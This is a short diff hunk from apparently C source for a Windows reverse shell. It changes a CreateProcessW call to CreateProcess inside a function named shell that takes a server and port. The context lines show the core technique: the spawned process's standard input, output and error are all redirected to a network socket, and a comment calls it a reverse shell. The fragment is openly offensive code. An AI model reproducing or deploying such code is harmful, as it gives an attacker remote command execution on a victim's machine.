@@ -37,7 +37,7 @@ int shell(LPWSTR server, unsigned int port) {
     sinfo.cb = sizeof sinfo;
     sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); // Tell it which other properties we're using
     sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socket; // Set all I/O to the socket
-    CreateProcessW(NULL, commandName, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+    CreateProcess(NULL, commandName, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
 
     // Clean up after reverse shell process completes
     WaitForSingleObject(pinfo.hProcess, INFINITE);
